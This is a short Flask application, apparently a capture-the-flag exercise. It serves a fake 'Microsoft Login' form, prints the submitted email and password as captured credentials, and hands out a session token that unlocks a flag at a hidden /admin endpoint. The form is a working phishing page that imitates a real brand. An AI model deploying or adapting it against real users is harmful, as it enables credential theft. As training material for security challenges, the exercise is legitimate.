from flask import Flask, request, redirect, make_response
import uuid

app = Flask(__name__)

sessions = {}

@app.route('/')
def login():
    return '''
    <h2>Microsoft Login</h2>
    <form method="POST" action="/login">
        Email: <input name="email"><br>
        Password: <input name="password" type="password"><br>
        <input type="submit">
    </form>
    '''

@app.route('/login', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')

    print("Captured creds:", email, password)

    session_token = str(uuid.uuid4())
    sessions[session_token] = email

    print("Stolen session token:", session_token)

    response = make_response(redirect("/dashboard"))
    response.set_cookie("session", session_token)

    return response

@app.route('/dashboard')
def dashboard():
    return '''
    <h2>Login successful</h2>
    <p>You are logged in.</p>
    <p>Nothing interesting here...</p>
    '''

# 🔥 Hidden endpoint (this is the real goal)
@app.route('/admin')
def admin():
    token = request.cookies.get("session")

    if token in sessions:
        flag = f"flag{{{token}}}"
        return f"""
        <h2>Admin Access Granted</h2>
        <p>Welcome {sessions[token]}</p>
        <p>Flag: <b>{flag}</b></p>
        """
    else:
        return "Access denied"

app.run(host='0.0.0.0', port=5000)